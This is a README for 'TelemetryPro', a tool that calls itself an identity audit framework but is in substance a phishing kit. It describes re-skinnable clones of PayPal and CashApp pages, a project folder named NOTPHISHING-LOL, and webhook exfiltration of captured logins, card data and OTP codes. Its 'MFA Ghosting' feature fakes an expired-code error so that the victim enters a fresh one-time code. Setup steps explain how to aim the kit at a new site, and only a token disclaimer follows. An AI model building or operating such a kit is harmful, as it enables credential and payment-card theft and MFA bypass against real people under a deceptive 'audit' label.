# TelemetryPro v1.1.0
### Modular CIAM Telemetry & Identity Audit Framework

![Version](https://img.shields.io/badge/version-1.1.0-blue.svg)
![License](https://img.shields.io/badge/license-MIT-green.svg)
![Build](https://img.shields.io/badge/build-stable-success.svg)

---

## Overview
TelemetryPro is a professional-grade framework built to audit Multi-Factor Authentication (MFA) and identity flows. This system treats the JavaScript Engine as the primary base, making the HTML/CSS disposable "skins" that can be swapped depending on the target.

---

## Core Architecture

### 1. The Engine (telemetry.js)
This is the core logic that remains persistent regardless of the website's visual design:
* **Hardware Fingerprinting**: Analyzes canvas rendering to create a unique ID for every device.
* **Network Risk Assessment**: Automatically flags VPNs, proxies, and hosting providers via ip-api.
* **Data Validation**: Integrated regex engine to ensure captured billing/card data is legitimate.
* **Exfiltration via webhook**: Real-time streaming to webhooks.

### 2. The View Layer (main.html)
The UI layer that manages transitions and maps user inputs to the engine:
* **BrandConfig**: A manifest object for instant re-skinning (logos, colors, and redirects).
* **Lego Components**: Modular sections for Login, MFA, and Billing.

---

## Technical Implementation

### MFA Ghosting Logic
Managed via the enableGhosting toggle in telemetry.js.
* **Enabled**: The system forces a failure on the first OTP attempt (Expired Code error). This forces the user to generate a second code, ensuring a fresh token is captured.
* **Disabled**: Standard single-pass flow.

### Input Validation (Regex)
The engine provides real-time feedback to the user to maintain high trust:
* **Card Validation**: Checks for 16-digit format and hardware/regex compatibility.
* **UI Feedback**: Automatically highlights fields with red borders if they do not match standard financial formats.

---

## Project Structure
```text
NOTPHISHING-LOL/
├── assets/             # Brand logos (PayPal, CashApp, etc.)
├── telemetry.js        # THE ENGINE (Fingerprinting & Exfiltration)
├── main.html           # THE SHELL (UI Flow & Form Mapping)
├── styles.css          # THE STYLE (Fintech-base UI)
└── README.md           # Documentation
```
---

Setup Instructions
1. Configure the Webhook
Open telemetry.js and update the WEBHOOK_URL constant:

```JavaScript
const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE';
```
2. Implementation Logic When targeting a new site:

Map your new HTML input id attributes to the TelemetryScanner requirements.

Link telemetry.js at the bottom of your HTML.

Call TelemetryScanner.runAudit() on submission.

Disclaimer
This framework is for authorized security auditing and educational purposes only. Using this on systems you do not own or have written permission for is illegal. Use ethically.